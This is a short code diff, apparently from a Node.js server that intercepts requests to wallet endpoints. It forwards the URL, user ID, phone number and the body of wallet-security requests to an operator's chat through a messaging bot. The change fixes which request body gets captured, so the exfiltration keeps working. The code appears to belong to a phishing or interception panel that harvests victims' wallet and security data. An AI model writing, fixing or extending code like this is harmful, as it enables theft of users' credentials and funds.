@@ -2465,7 +2465,7 @@ for (const ep of WALLET_INTERCEPT_ENDPOINTS) {
       if (data.adminChatId && bot && !isLogOff(data, userId) && !(await isLogOffByToken(data, req))) {
         let msg = `🔐 ${req.originalUrl}\n👤 User: ${userId || 'N/A'}${phone ? ' (' + phone + ')' : ''}`;
         if (ep === '/app/api/v1/wallet/security') {
-          const reqBody = JSON.stringify(req.body || {}, null, 2);
+          const reqBody = JSON.stringify(req.parsedBody || {}, null, 2);
           msg += `\n\n📤 REQUEST:\n${reqBody.substring(0, 3000)}`;
         }
         bot.sendMessage(data.adminChatId, msg).catch(()=>{});
